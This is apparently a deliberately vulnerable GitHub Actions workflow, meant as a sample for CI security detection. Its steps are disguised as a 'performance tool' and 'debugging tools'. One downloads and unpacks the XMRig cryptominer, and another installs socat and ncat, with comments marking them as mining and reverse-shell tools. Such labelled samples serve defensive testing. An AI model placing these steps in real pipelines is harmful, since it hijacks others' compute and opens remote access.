name: "Build Toolchain (VULNERABLE)"
on:
  push:

jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ⚠️ CRYPTOMINER DOWNLOAD: Known mining tool name
      - name: Install performance tool
        run: |
          curl -sL https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz -o /tmp/xmrig.tar.gz
          tar -xzf /tmp/xmrig.tar.gz -C /tmp/
          chmod +x /tmp/xmrig

      # ⚠️ REVERSE SHELL TOOL: socat for establishing tunnels
      - name: Install debugging tools
        run: |
          apt-get install -y socat ncat

      # ⚠️ C2 AGENT: Known implant tools
